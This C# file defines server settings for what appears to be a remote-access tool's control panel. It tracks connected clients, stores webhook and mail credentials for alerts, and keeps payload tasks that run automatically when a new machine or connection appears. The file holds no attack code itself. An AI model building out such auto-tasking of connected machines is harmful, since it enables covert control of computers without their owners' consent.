using System.Collections.Generic;
using System.IO;
using System.Text.Json;

namespace Server
{
    internal class Settings
    {
        public static List<Clients> Controler = new();
        public static List<Clients> Online = new();
        public static long Sent = 0;
        public static long Received = 0;
        public static string Password = "";
        public static int Port = 0;
        public static NotifyConfig notifyConfig { get; set; }
        public static List<ClientTask> clientTasks { get; set; }


        public class NotifyConfig
        {
            //DingTalk
            public bool DingTalk { get; set; }
            public string DingTalkWebHook { get; set; }
            public string DingTalkSecret { get; set; }

            //Mail
            public bool Mail { get; set; }
            public string MailFromAddress { get; set; }
            public string MailToAddress { get; set; }
            public string MailSMTPAddress { get; set; }
            public int MailSMTPPort { get; set; }
            public string MailPassword { get; set; }

            //Telegram
            public bool Telegram { get; set; }
            public string TelegramApiToken { get; set; }
            public string TelegramChannelID { get; set; }

            //Discord
            public bool Discord { get; set; }
            public string DiscordWebhook { get; set; }

            public static NotifyConfig Init()
            {
                try
                {
                    if (!File.Exists("NotifyConfig.json")) Save(new NotifyConfig());
                    var jsonString = File.ReadAllText("NotifyConfig.json");
                    return JsonSerializer.Deserialize<NotifyConfig>(jsonString);
                }
                catch
                {
                    return new NotifyConfig();
                }
            }

            public static void Save(NotifyConfig configs)
            {
                var jsonString = JsonSerializer.Serialize(configs);
                File.WriteAllText("NotifyConfig.json", jsonString);
            }
        }

        public class ClientTask
        {
            public string Name { get; set; }
            public byte[] mspack { get; set; }
            public bool status { get; set; }
            public TriggerType triggerType { get; set; }

            public enum TriggerType
            {
                New_Machine,
                New_Connection
            }

            public static List<ClientTask> Init()
            {
                try
                {
                    if (!File.Exists("ClientTasks.json")) Save(new List<ClientTask>());
                    var jsonString = File.ReadAllText("ClientTasks.json");
                    return JsonSerializer.Deserialize<List<ClientTask>>(jsonString);
                }
                catch
                {
                    return new List<ClientTask>();
                }
            }

            public static void Save(List<ClientTask> clientTask)
            {
                var jsonString = JsonSerializer.Serialize(clientTask);
                File.WriteAllText("ClientTasks.json", jsonString);
            }
        }
    }
}